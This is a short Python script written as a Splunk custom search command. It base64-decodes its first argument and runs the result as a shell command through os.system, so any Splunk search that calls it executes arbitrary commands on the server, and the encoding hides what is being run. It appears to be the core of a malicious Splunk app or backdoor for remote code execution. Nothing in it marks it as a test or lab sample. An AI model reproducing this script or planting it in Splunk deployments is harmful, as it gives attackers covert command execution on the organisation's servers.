import sys
import base64
import splunk.Intersplunk

results = []

try:
        sys.modules['os'].system(base64.b64decode(sys.argv[1]))

except:
        import traceback
        stack = traceback.format_exc()
        results = splunk.Intersplunk.generateErrorResults("Error : Traceback: " + str(stack))

splunk.Intersplunk.outputResults(results)
